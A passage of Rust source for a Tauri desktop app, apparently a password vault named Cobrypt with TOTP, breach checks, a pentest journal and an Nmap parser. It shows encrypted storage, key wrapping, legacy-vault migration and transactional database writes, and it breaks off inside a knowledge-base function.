#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod vault;
mod totp;
mod hibp;
mod journal;
mod nmap;
mod kb;
mod backup;
mod activity;
mod util;

use std::path::{Path, PathBuf};
use std::sync::Mutex;
use tauri::Manager;
use util::{check_field, constant_time_eq, fill_random, uuid_v4, wipe_strings};
use vault::{AppState, Credential, CredentialInput, Dek};
use rusqlite::Connection;
use base64::Engine;
use zeroize::Zeroize;

const CURRENT_DATABASE_NAME: &str = "cobrypt.db";
const LEGACY_DATABASE_NAME: &str = "keyrpt.db";
const LEGACY_IDENTIFIER: &str = "com.keyrpt.app";

fn copy_database_atomically(source: &Path, destination: &Path) -> Result<(), String> {
    let parent = destination.parent().ok_or("Cobrypt database path has no parent")?;
    std::fs::create_dir_all(parent).map_err(|e| format!("failed to create Cobrypt data directory: {e}"))?;

    let temp_path = destination.with_extension(format!("db.migrating-{}", uuid_v4()));
    let migration = (|| -> Result<(), String> {
        let source_db = Connection::open_with_flags(
            source,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        ).map_err(|e| format!("failed to open legacy KeyRPT database: {e}"))?;

        source_db.execute(
            "VACUUM INTO ?1",
            rusqlite::params![temp_path.to_string_lossy().as_ref()],
        ).map_err(|e| format!("failed to copy legacy KeyRPT database: {e}"))?;
        drop(source_db);

        let copied_db = Connection::open_with_flags(
            &temp_path,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        ).map_err(|e| format!("failed to validate migrated Cobrypt database: {e}"))?;
        let integrity: String = copied_db
            .query_row("PRAGMA quick_check", [], |row| row.get(0))
            .map_err(|e| format!("failed to check migrated Cobrypt database: {e}"))?;
        drop(copied_db);

        if integrity != "ok" {
            return Err(format!("legacy KeyRPT database failed integrity check: {integrity}"));
        }

        // A hard link creates the destination atomically and fails if it already
        // exists, so a concurrent startup can never overwrite a Cobrypt vault.
        std::fs::hard_link(&temp_path, destination)
            .map_err(|e| format!("failed to activate migrated Cobrypt database: {e}"))?;
        let _ = std::fs::remove_file(&temp_path);
        Ok(())
    })();

    if migration.is_err() {
        let _ = std::fs::remove_file(&temp_path);
    }
    migration
}

fn migrate_database_if_needed(current: &Path, candidates: &[PathBuf]) -> Result<bool, String> {
    if current.exists() {
        return Ok(false);
    }

    if let Some(source) = candidates.iter().find(|candidate| candidate.is_file()) {
        copy_database_atomically(source, current)?;
        return Ok(true);
    }

    Ok(false)
}

fn vault_path(app: &tauri::AppHandle) -> Result<PathBuf, String> {
    let current_dir = app.path().app_data_dir().map_err(|e| e.to_string())?;
    let current_path = current_dir.join(CURRENT_DATABASE_NAME);
    let mut legacy_candidates = vec![current_dir.join(LEGACY_DATABASE_NAME)];

    if let Some(data_root) = current_dir.parent() {
        legacy_candidates.push(data_root.join(LEGACY_IDENTIFIER).join(LEGACY_DATABASE_NAME));
    }

    migrate_database_if_needed(&current_path, &legacy_candidates)?;
    Ok(current_path)
}

/// Minimum master-password length accepted when a password is *created* or
/// *changed*. It is deliberately not enforced when verifying an existing
/// password, so a vault created before this rule can still be unlocked.
const MIN_MASTER_PASSWORD_CHARS: usize = 12;
/// Minimum length for a backup password, which protects the entire vault.
const MIN_BACKUP_PASSWORD_CHARS: usize = 8;

const MAX_FIELD_CHARS: usize = 8_192;
const MAX_LONG_FIELD_CHARS: usize = 65_536;

/// Check vault is unlocked — returns the DEK in a guard that wipes it on drop.
fn require_unlocked(state: &AppState) -> Result<Dek, String> {
    let key = state.encryption_key.lock().map_err(|e| e.to_string())?;
    key.map(Dek::new).ok_or_else(|| "vault is locked".into())
}

fn require_db(state: &AppState) -> Result<std::sync::MutexGuard<'_, Connection>, String> {
    state.db.lock().map_err(|e| e.to_string())
}

/// Run `write` inside one immediate transaction, rolling back on any failure.
///
/// Multi-step writes must be all-or-nothing: a crash or error between two
/// statements otherwise leaves a half-applied change behind.
fn in_transaction<T, F>(db: &Connection, write: F) -> Result<T, String>
where
    F: FnOnce() -> Result<T, String>,
{
    db.execute("BEGIN IMMEDIATE", []).map_err(|e| e.to_string())?;
    match write() {
        Ok(value) => {
            if db.execute("COMMIT", []).is_err() {
                db.execute("ROLLBACK", []).ok();
                return Err("transaction failed to commit, no changes were made".into());
            }
            Ok(value)
        }
        Err(e) => {
            db.execute("ROLLBACK", []).ok();
            Err(e)
        }
    }
}

/// Reject an empty password before it reaches Argon2.
fn reject_empty_password(password: &str, label: &str) -> Result<(), String> {
    if password.is_empty() {
        return Err(format!("{label} must not be empty"));
    }
    Ok(())
}

/// Enforce a minimum length for a password being created or changed.
fn require_min_length(password: &str, label: &str, min_chars: usize) -> Result<(), String> {
    reject_empty_password(password, label)?;
    if password.chars().count() < min_chars {
        return Err(format!(
            "{label} must be at least {min_chars} characters"
        ));
    }
    Ok(())
}

/// Validate a credential's user-supplied fields before storing them.
fn validate_credential(input: &CredentialInput) -> Result<(), String> {
    check_field(&input.service, "service", MAX_FIELD_CHARS)?;
    check_field(&input.username, "username", MAX_FIELD_CHARS)?;
    check_field(&input.url, "url", MAX_FIELD_CHARS)?;
    check_field(&input.password, "password", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.notes, "notes", MAX_LONG_FIELD_CHARS)?;
    if input.service.trim().is_empty() {
        return Err("service must not be empty".into());
    }
    Ok(())
}

// --- Impl functions (called by both commands and tests) ---

#[tauri::command]
fn get_credentials(state: tauri::State<AppState>) -> Result<Vec<Credential>, String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;

    let mut stmt = db
        .prepare("SELECT id, service, username, password_encrypted, url, notes, totp_secret, created_at FROM credentials ORDER BY service")
        .map_err(|e| e.to_string())?;

    let credentials = stmt.query_map([], |row| {
        Ok(Credential {
            id: row.get(0)?, service: row.get(1)?, username: row.get(2)?,
            password_encrypted: row.get(3)?, url: row.get(4)?, notes: row.get(5)?,
            totp_secret: row.get(6)?, totp_code: None, created_at: row.get(7)?,
        })
    })
    .map_err(|e| e.to_string())?
    .collect::<Result<Vec<_>, _>>()
    .map_err(|e| e.to_string())?;

    let results = credentials.into_iter().map(|mut c| {
        // Decrypt all encrypted fields
        c.password_encrypted = vault::decrypt(&_key, &c.password_encrypted).unwrap_or_else(|_| "[decryption failed]".into());
        c.username = vault::decrypt_opt(&_key, &Some(c.username)).unwrap_or_else(|| "".into());
        c.url = vault::decrypt_opt(&_key, &Some(c.url)).unwrap_or_else(|| "".into());
        c.notes = vault::decrypt_opt(&_key, &Some(c.notes)).unwrap_or_else(|| "".into());
        if let Some(ref secret) = c.totp_secret {
            c.totp_secret = vault::decrypt_opt(&_key, &Some(secret.clone()));
            if let Some(ref decrypted_secret) = c.totp_secret {
                c.totp_code = totp::generate_code(decrypted_secret).ok();
            }
        }
        c
    }).collect();

    Ok(results)
}

#[tauri::command]
fn add_credential(state: tauri::State<AppState>, input: CredentialInput) -> Result<Credential, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    validate_credential(&input)?;

    let id = uuid_v4();
    let encrypted_pw = vault::encrypt(&key, &input.password)?;
    let encrypted_user = vault::encrypt(&key, &input.username)?;
    let encrypted_url = vault::encrypt(&key, &input.url)?;
    let encrypted_notes = vault::encrypt(&key, &input.notes)?;

    let service = input.service.clone();
    let id_for_insert = id.clone();
    in_transaction(&db, || {
        db.execute(
            "INSERT INTO credentials (id, service, username, password_encrypted, url, notes) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            rusqlite::params![id_for_insert, service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes],
        ).map_err(|e| e.to_string())?;
        activity::log_action(&db, "credential_add", &format!("added {}", service));
        Ok(())
    })?;

    Ok(Credential { id, service: input.service, username: input.username, password_encrypted: input.password, url: input.url, notes: input.notes, created_at: "just now".into(), totp_secret: None, totp_code: None })
}

#[tauri::command]
fn update_credential(state: tauri::State<AppState>, id: String, input: CredentialInput) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    validate_credential(&input)?;

    let encrypted_pw = if input.password.is_empty() {
        db.query_row("SELECT password_encrypted FROM credentials WHERE id = ?1", rusqlite::params![id], |row| row.get::<_, String>(0))
            .map_err(|e| e.to_string())?
    } else {
        vault::encrypt(&key, &input.password)?
    };
    let encrypted_user = vault::encrypt(&key, &input.username)?;
    let encrypted_url = vault::encrypt(&key, &input.url)?;
    let encrypted_notes = vault::encrypt(&key, &input.notes)?;

    db.execute(
        "UPDATE credentials SET service=?1, username=?2, password_encrypted=?3, url=?4, notes=?5 WHERE id=?6",
        rusqlite::params![input.service, encrypted_user, encrypted_pw, encrypted_url, encrypted_notes, id],
    ).map_err(|e| e.to_string())?;

    Ok(())
}

#[tauri::command]
fn delete_credential(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    in_transaction(&db, || {
        db.execute("DELETE FROM credentials WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
        activity::log_action(&db, "credential_delete", "deleted credential");
        Ok(())
    })?;
    Ok(())
}

// ===== Unlock / Lock =====

#[tauri::command]
fn unlock_vault(state: tauri::State<AppState>, master_password: String) -> Result<bool, String> {
    let db = require_db(&state)?;

    let encrypted_dek: String = db.query_row("SELECT value FROM vault_config WHERE key = 'encrypted_dek'", [], |row| row.get(0))
        .map_err(|e| e.to_string())?;
    let stored_hash: String = db.query_row("SELECT value FROM vault_config WHERE key = 'password_hash'", [], |row| row.get(0))
        .map_err(|e| e.to_string())?;

    // Check for legacy vault (pre-DEK model) that needs migration
    let legacy_hash: String = db.query_row("SELECT COALESCE((SELECT value FROM vault_config WHERE key = 'master_hash'), '')", [], |row| row.get(0))
        .map_err(|e| e.to_string())?;

    let is_legacy = !legacy_hash.is_empty() && encrypted_dek.is_empty() && stored_hash.is_empty();
    let is_fresh = encrypted_dek.is_empty() && stored_hash.is_empty() && legacy_hash.is_empty();

    // Legacy migration — must run before any other path
    if is_legacy {
        // Pass the already-acquired db guard to avoid deadlock
        let db_ref = &*db; // deref MutexGuard to get &Connection
        return migrate_legacy_vault(db_ref, &state, &master_password, &legacy_hash);
    }

    // load or generate per-vault KDF salt
    let stored_salt: String = db.query_row("SELECT COALESCE((SELECT value FROM vault_config WHERE key = 'kdf_salt'), '')", [], |row| row.get(0))
        .map_err(|e| e.to_string())?;

    let kdf_salt: Vec<u8> = if stored_salt.is_empty() {
        let mut s = vec![0u8; 32];
        fill_random(&mut s);
        let encoded = base64::engine::general_purpose::STANDARD.encode(&s);
        db.execute("INSERT OR IGNORE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![encoded])
            .map_err(|e| e.to_string())?;
        s
    } else {
        base64::engine::general_purpose::STANDARD.decode(&stored_salt).map_err(|e| e.to_string())?
    };

    // First setup — create new vault
    if is_fresh {
        // This is the one path where we choose the password, so it is the one
        // place a strength rule can be enforced without locking anyone out of a
        // vault whose password was set before the rule existed.
        require_min_length(&master_password, "Master password", MIN_MASTER_PASSWORD_CHARS)?;

        let mut wrapping_key = vault::derive_key(&master_password, &kdf_salt)?;
        let dek = vault::generate_dek();
        let wrapped = vault::wrap_dek(&dek, &wrapping_key)?;
        wrapping_key.zeroize();
        let pass_hash = vault::hash_password(&master_password)?;

        in_transaction(&db, || {
            db.execute("UPDATE vault_config SET value = ?1 WHERE key = 'encrypted_dek'", rusqlite::params![wrapped]).map_err(|e| e.to_string())?;
            db.execute("UPDATE vault_config SET value = ?1 WHERE key = 'password_hash'", rusqlite::params![pass_hash]).map_err(|e| e.to_string())?;
            db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).map_err(|e| e.to_string())?;
            activity::log_action(&db, "unlock", "new vault created + unlocked");
            Ok(())
        })?;

        let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
        *ek = Some(dek);
        return Ok(true);
    }

    // Verify password hash
    if !vault::verify_password(&master_password, &stored_hash)? {
        return Ok(false);
    }

    // Unwrap DEK
    let mut wrapping_key = vault::derive_key(&master_password, &kdf_salt)?;
    let dek = vault::unwrap_dek(&encrypted_dek, &wrapping_key)?;
    wrapping_key.zeroize();

    // Migrate before publishing the key, so a failed migration leaves the vault
    // locked rather than unlocked in a half-migrated state.
    migrate_plaintext_fields(&db, &dek)?;

    {
        let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
        *ek = Some(dek);
    }
    activity::log_action(&db, "unlock", "vault unlocked");
    Ok(true)
}

/// Migrate a legacy vault (pre-DEK model) to the new DEK model.
/// Legacy vaults have master_hash = base64(derive_key(password, legacy_salt)).
/// We decrypt all credentials with that legacy key, re-encrypt under a new random DEK,
/// wrap the DEK, and replace master_hash with password_hash.
fn migrate_legacy_vault(
    db: &Connection,
    state: &AppState,
    master_password: &str,
    legacy_hash: &str,
) -> Result<bool, String> {
    // Legacy salt: the original hardcoded salt from the pre-DEK era
    let legacy_salt = [0x4b, 0x65, 0x79, 0x52, 0x50, 0x54, 0x30, 0x31]; // "KeyRPT01"

    // Derive the legacy key and verify
    let mut legacy_key = vault::derive_key(master_password, &legacy_salt)?;
    let check_hash = base64::engine::general_purpose::STANDARD.encode(legacy_key);
    // Constant-time: this comparison decides whether the caller guessed the
    // master password, so it must not leak how many leading bytes matched.
    if !constant_time_eq(check_hash.as_bytes(), legacy_hash.as_bytes()) {
        legacy_key.zeroize();
        return Ok(false); // wrong password
    }

    // Read all existing credentials (encrypted with legacy key)
    let mut stmt = db
        .prepare("SELECT id, service, username, password_encrypted, url, notes, totp_secret, created_at FROM credentials")
        .map_err(|e| e.to_string())?;

    #[derive(Debug)]
    #[allow(dead_code)]
    struct RawCred {
        id: String, service: String, username: String,
        password_encrypted: String, url: String,
        notes: String, totp_secret: Option<String>, created_at: String,
    }

    let raw_creds: Vec<RawCred> = stmt
        .query_map([], |row| Ok(RawCred {
            id: row.get(0)?, service: row.get(1)?, username: row.get(2)?,
            password_encrypted: row.get(3)?, url: row.get(4)?,
            notes: row.get(5)?, totp_secret: row.get(6)?, created_at: row.get(7)?,
        }))
        .map_err(|e| e.to_string())?
        .collect::<Result<Vec<_>, _>>()
        .map_err(|e| e.to_string())?;

    // Decrypt passwords with legacy key
    let mut decrypted_passwords: Vec<String> = Vec::new();
    for cred in &raw_creds {
        let plain = vault::decrypt(&legacy_key, &cred.password_encrypted)?;
        decrypted_passwords.push(plain);
    }

    // Generate new DEK + new per-vault salt + wrapping key
    let new_dek = vault::generate_dek();
    let mut new_salt = [0u8; 32];
    fill_random(&mut new_salt);
    let salt_b64 = base64::engine::general_purpose::STANDARD.encode(new_salt);
    let mut wrapping_key = vault::derive_key(master_password, &new_salt)?;
    let wrapped_dek = vault::wrap_dek(&new_dek, &wrapping_key)?;
    wrapping_key.zeroize();
    let pass_hash = vault::hash_password(master_password)?;

    // Run entire migration in a transaction
    in_transaction(db, || {
        // Re-encrypt all credentials with new DEK
        for (i, cred) in raw_creds.iter().enumerate() {
            let new_enc = vault::encrypt(&new_dek, &decrypted_passwords[i])?;
            db.execute(
                "UPDATE credentials SET password_encrypted = ?1 WHERE id = ?2",
                rusqlite::params![new_enc, cred.id],
            ).map_err(|e| e.to_string())?;
        }

        // Write new vault config
        db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('encrypted_dek', ?1)", rusqlite::params![wrapped_dek]).map_err(|e| e.to_string())?;
        db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('password_hash', ?1)", rusqlite::params![pass_hash]).map_err(|e| e.to_string())?;
        db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('kdf_salt', ?1)", rusqlite::params![salt_b64]).map_err(|e| e.to_string())?;

        // Clear legacy master_hash
        db.execute("DELETE FROM vault_config WHERE key = 'master_hash'", []).map_err(|e| e.to_string())?;
        Ok(())
    })
    .map_err(|e| format!("migration failed: {}", e))?;

    legacy_key.zeroize();
    wipe_strings(&mut decrypted_passwords);

    migrate_plaintext_fields(db, &new_dek)?;

    {
        let mut ek = state.encryption_key.lock().map_err(|e| e.to_string())?;
        *ek = Some(new_dek);
    }
    activity::log_action(db, "migration", "legacy vault migrated to DEK model");
    Ok(true)
}

/// Migrate plaintext fields to encrypted (schema v1 → v2).
fn migrate_plaintext_fields(db: &Connection, dek: &[u8; 32]) -> Result<(), String> {
    let version: String = db.query_row(
        "SELECT value FROM vault_config WHERE key = 'schema_version'",
        [], |r| r.get(0)
    ).unwrap_or_else(|_| "1".into());

    if version != "1" { return Ok(()); }

    // All five tables plus the version bump commit together. Previously a
    // failure part-way through left some fields encrypted and others plaintext
    // while the version still advertised v1, so the next unlock would re-encrypt
    // the fields that had already succeeded.
    in_transaction(db, || migrate_plaintext_fields_inner(db, dek))
}

/// The table-by-table migration body. Always runs inside a transaction.
fn migrate_plaintext_fields_inner(db: &Connection, dek: &[u8; 32]) -> Result<(), String> {
    // credentials: username, url, notes
    {
        let mut stmt = db.prepare("SELECT id, username, url, notes FROM credentials").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, u, url, n) in rows {
            db.execute("UPDATE credentials SET username=?1, url=?2, notes=?3 WHERE id=?4",
                rusqlite::params![vault::encrypt(dek, &u)?, vault::encrypt(dek, &url)?, vault::encrypt(dek, &n)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // TOTP secrets
    {
        let mut stmt = db.prepare("SELECT id, totp_secret FROM credentials WHERE totp_secret IS NOT NULL AND totp_secret != ''").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, sec) in rows {
            db.execute("UPDATE credentials SET totp_secret=?1 WHERE id=?2",
                rusqlite::params![vault::encrypt(dek, &sec)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // projects: description, target, methodology
    {
        let mut stmt = db.prepare("SELECT id, description, target, methodology FROM projects").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, d, t, m) in rows {
            db.execute("UPDATE projects SET description=?1, target=?2, methodology=?3 WHERE id=?4",
                rusqlite::params![vault::encrypt(dek, &d)?, vault::encrypt(dek, &t)?, vault::encrypt(dek, &m)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // journal_entries: title, content
    {
        let mut stmt = db.prepare("SELECT id, title, content FROM journal_entries").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, t, c) in rows {
            db.execute("UPDATE journal_entries SET title=?1, content=?2 WHERE id=?3",
                rusqlite::params![vault::encrypt(dek, &t)?, vault::encrypt(dek, &c)?, id]).map_err(|e| e.to_string())?;
        }
    }
    // kb_entries: title, command, description, tags
    {
        let mut stmt = db.prepare("SELECT id, title, command, description, tags FROM kb_entries").map_err(|e| e.to_string())?;
        let rows: Vec<(String, String, String, String, String)> = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?)))
            .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string())?;
        for (id, ti, cmd, d, ta) in rows {
            db.execute("UPDATE kb_entries SET title=?1, command=?2, description=?3, tags=?4 WHERE id=?5",
                rusqlite::params![vault::encrypt(dek, &ti)?, vault::encrypt(dek, &cmd)?, vault::encrypt(dek, &d)?, vault::encrypt(dek, &ta)?, id]).map_err(|e| e.to_string())?;
        }
    }

    db.execute("INSERT OR REPLACE INTO vault_config (key, value) VALUES ('schema_version', '2')", []).map_err(|e| e.to_string())?;
    Ok(())
}

#[tauri::command]
fn lock_vault(state: tauri::State<AppState>) -> Result<(), String> {
    let db = require_db(&state)?;
    activity::log_action(&db, "lock", "vault locked");
    let mut key = state.encryption_key.lock().map_err(|e| e.to_string())?;
    // Overwrite the key material in place before dropping the reference to it,
    // rather than just releasing it back to the allocator.
    if let Some(dek) = key.as_mut() {
        dek.zeroize();
    }
    *key = None;
    Ok(())
}

// ===== TOTP =====

#[tauri::command]
fn setup_totp(state: tauri::State<AppState>, credential_id: String, secret: String) -> Result<(), String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    totp::validate_secret(&secret)?;
    let encrypted = vault::encrypt(&key, &secret.trim().to_uppercase())?;
    let updated = db.execute("UPDATE credentials SET totp_secret = ?1 WHERE id = ?2", rusqlite::params![encrypted, credential_id])
        .map_err(|e| e.to_string())?;
    if updated == 0 {
        return Err("credential not found".into());
    }
    Ok(())
}

#[tauri::command]
fn get_totp_remaining() -> Result<u64, String> {
    Ok(totp::remaining_seconds())
}

#[tauri::command]
fn remove_totp(state: tauri::State<AppState>, credential_id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    db.execute("UPDATE credentials SET totp_secret = NULL WHERE id = ?1", rusqlite::params![credential_id])
        .map_err(|e| e.to_string())?;
    Ok(())
}

// ===== HIBP =====

#[tauri::command]
async fn check_hibp(state: tauri::State<'_, AppState>, password: String) -> Result<u32, String> {
    // This hands a plaintext password to a network client, so it must not be
    // reachable while the vault is locked.
    let _key = require_unlocked(&state)?;
    hibp::check_password(&password).await
}

// ===== Journal =====

#[tauri::command]
fn create_project(state: tauri::State<AppState>, input: journal::ProjectInput) -> Result<journal::Project, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    check_field(&input.name, "project name", MAX_FIELD_CHARS)?;
    check_field(&input.description, "project description", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.target, "project target", MAX_FIELD_CHARS)?;
    check_field(&input.methodology, "project methodology", MAX_LONG_FIELD_CHARS)?;
    if input.name.trim().is_empty() {
        return Err("project name must not be empty".into());
    }
    let id = uuid_v4();
    let enc_desc = vault::encrypt(&key, &input.description)?;
    let enc_target = vault::encrypt(&key, &input.target)?;
    let enc_method = vault::encrypt(&key, &input.methodology)?;
    db.execute("INSERT INTO projects (id, name, description, target, methodology) VALUES (?1, ?2, ?3, ?4, ?5)",
        rusqlite::params![id, input.name, enc_desc, enc_target, enc_method])
        .map_err(|e| e.to_string())?;
    Ok(journal::Project { id, name: input.name, description: input.description, target: input.target, methodology: input.methodology, status: "planning".into(), created_at: "just now".into(), updated_at: "just now".into() })
}

#[tauri::command]
fn get_projects(state: tauri::State<AppState>) -> Result<Vec<journal::Project>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let mut stmt = db.prepare("SELECT id, name, description, target, methodology, status, created_at, updated_at FROM projects ORDER BY updated_at DESC")
        .map_err(|e| e.to_string())?;
    let results = stmt.query_map([], |row| {
        let enc_desc: String = row.get(2)?;
        let enc_target: String = row.get(3)?;
        let enc_method: String = row.get(4)?;
        Ok(journal::Project {
            id: row.get(0)?, name: row.get(1)?,
            description: vault::decrypt(&key, &enc_desc).unwrap_or_default(),
            target: vault::decrypt(&key, &enc_target).unwrap_or_default(),
            methodology: vault::decrypt(&key, &enc_method).unwrap_or_default(),
            status: row.get(5)?, created_at: row.get(6)?, updated_at: row.get(7)?,
        })
    })
    .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
    results
}

#[tauri::command]
fn delete_project(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    // The entries and the project must disappear together: a crash between the
    // two deletes used to leave orphaned entries behind.
    in_transaction(&db, || {
        db.execute("DELETE FROM journal_entries WHERE project_id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
        db.execute("DELETE FROM projects WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
        Ok(())
    })?;
    Ok(())
}

#[tauri::command]
fn add_entry(state: tauri::State<AppState>, input: journal::EntryInput) -> Result<journal::JournalEntry, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    check_field(&input.title, "entry title", MAX_FIELD_CHARS)?;
    check_field(&input.content, "entry content", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.entry_type, "entry type", MAX_FIELD_CHARS)?;
    check_field(&input.severity, "severity", MAX_FIELD_CHARS)?;
    if input.title.trim().is_empty() {
        return Err("entry title must not be empty".into());
    }
    let id = uuid_v4();
    let enc_title = vault::encrypt(&key, &input.title)?;
    let enc_content = vault::encrypt(&key, &input.content)?;
    let project_id = input.project_id.clone();
    let id_for_insert = id.clone();
    in_transaction(&db, || {
        db.execute("INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            rusqlite::params![id_for_insert, project_id, enc_title, enc_content, input.entry_type, input.severity])
            .map_err(|e| e.to_string())?;
        db.execute("UPDATE projects SET updated_at = datetime('now') WHERE id = ?1", rusqlite::params![project_id]).map_err(|e| e.to_string())?;
        Ok(())
    })?;
    Ok(journal::JournalEntry { id, project_id: input.project_id, title: input.title, content: input.content, entry_type: input.entry_type, severity: input.severity, created_at: "just now".into() })
}

#[tauri::command]
fn get_entries(state: tauri::State<AppState>, project_id: String) -> Result<Vec<journal::JournalEntry>, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    let mut stmt = db.prepare("SELECT id, project_id, title, content, entry_type, severity, created_at FROM journal_entries WHERE project_id = ?1 ORDER BY created_at DESC")
        .map_err(|e| e.to_string())?;
    let results = stmt.query_map(rusqlite::params![project_id], |row| {
        let enc_title: String = row.get(2)?;
        let enc_content: String = row.get(3)?;
        Ok(journal::JournalEntry {
            id: row.get(0)?, project_id: row.get(1)?,
            title: vault::decrypt(&key, &enc_title).unwrap_or_else(|_| "[decryption failed]".into()),
            content: vault::decrypt(&key, &enc_content).unwrap_or_else(|_| "[decryption failed]".into()),
            entry_type: row.get(4)?, severity: row.get(5)?, created_at: row.get(6)?,
        })
    })
    .map_err(|e| e.to_string())?.collect::<Result<Vec<_>,_>>().map_err(|e| e.to_string());
    results
}

#[tauri::command]
fn delete_entry(state: tauri::State<AppState>, id: String) -> Result<(), String> {
    let _key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    db.execute("DELETE FROM journal_entries WHERE id = ?1", rusqlite::params![id]).map_err(|e| e.to_string())?;
    Ok(())
}

/// Insert a batch of journal entries as one all-or-nothing operation.
///
/// Shared by the command and the tests. Used for bulk operations such as saving
/// a parsed scan, where a partial write would leave an engagement with some of
/// its hosts recorded and no way to tell which.
fn insert_entries(
    db: &Connection,
    key: &[u8; 32],
    inputs: &[journal::EntryInput],
) -> Result<usize, String> {
    if inputs.is_empty() {
        return Ok(0);
    }

    // Validate and encrypt everything before opening the transaction, so a bad
    // row cannot leave the batch half-written.
    let mut prepared = Vec::with_capacity(inputs.len());
    for input in inputs {
        check_field(&input.title, "entry title", MAX_FIELD_CHARS)?;
        check_field(&input.content, "entry content", MAX_LONG_FIELD_CHARS)?;
        check_field(&input.entry_type, "entry type", MAX_FIELD_CHARS)?;
        check_field(&input.severity, "severity", MAX_FIELD_CHARS)?;
        if input.title.trim().is_empty() {
            return Err("entry title must not be empty".into());
        }
        prepared.push((
            uuid_v4(),
            input.project_id.clone(),
            vault::encrypt(key, &input.title)?,
            vault::encrypt(key, &input.content)?,
            input.entry_type.clone(),
            input.severity.clone(),
        ));
    }

    in_transaction(db, || {
        let mut touched_projects: Vec<&String> = Vec::new();
        for (id, project_id, title, content, entry_type, severity) in &prepared {
            db.execute(
                "INSERT INTO journal_entries (id, project_id, title, content, entry_type, severity) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
                rusqlite::params![id, project_id, title, content, entry_type, severity],
            ).map_err(|e| e.to_string())?;
            if !touched_projects.contains(&project_id) {
                touched_projects.push(project_id);
            }
        }
        for project_id in &touched_projects {
            db.execute(
                "UPDATE projects SET updated_at = datetime('now') WHERE id = ?1",
                rusqlite::params![project_id],
            ).map_err(|e| e.to_string())?;
        }
        Ok(prepared.len())
    })
}

#[tauri::command]
fn add_entries(state: tauri::State<AppState>, inputs: Vec<journal::EntryInput>) -> Result<usize, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    insert_entries(&db, &key, &inputs)
}

// ===== Nmap =====

#[tauri::command]
fn parse_nmap(xml_content: String) -> Result<nmap::NmapScan, String> {
    nmap::parse_nmap_xml(&xml_content)
}

// ===== Command KB =====

#[tauri::command]
fn add_kb_entry(state: tauri::State<AppState>, input: kb::KBInput) -> Result<kb::KBEntry, String> {
    let key = require_unlocked(&state)?;
    let db = require_db(&state)?;
    check_field(&input.title, "title", MAX_FIELD_CHARS)?;
    check_field(&input.command, "command", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.description, "description", MAX_LONG_FIELD_CHARS)?;
    check_field(&input.tags, "tags", MAX_FIELD_CHARS)?;
    check_field(&input.category, "category", MAX_FIELD_CHARS)?;
    if input.title.trim().is_empty() {
        return Err("title must not be empty".into());
    }
    let id = uuid_v4();
    let enc_title = vault::encrypt(&key, &input.title)?;
    let enc_cmd = vault::encrypt(&key, &input.command)?;
    let enc_desc = vault::encrypt(&key, &input.description)?;
    let enc_tags = vault::encrypt(&key, &input.tags)?;
